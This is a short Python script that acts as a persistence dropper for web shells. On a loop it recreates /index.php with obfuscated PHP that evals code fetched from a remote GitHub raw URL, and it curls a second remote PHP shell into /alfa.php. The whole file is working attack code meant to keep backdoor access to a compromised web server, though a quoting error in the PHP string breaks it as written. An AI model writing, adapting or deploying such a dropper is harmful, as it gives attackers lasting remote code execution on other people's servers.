import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/index.php') 
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(300)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            
            a = open('/index.php','a') 
            
            a.write("<?php $MEMEKCYNA = "file" . "_get_contents"; eval("?>" . $MEMEKCYNA("https://raw.githubusercontent.com/sniper404ghostxploit/SHELL/main/Jancok.php")); ?>")
            
            a.close()
            
            os.system('curl "https://raw.githubusercontent.com/sniper404ghostxploit/SHELL/main/yz.php" > /alfa.php')
            
            time.sleep(300)
            
main()
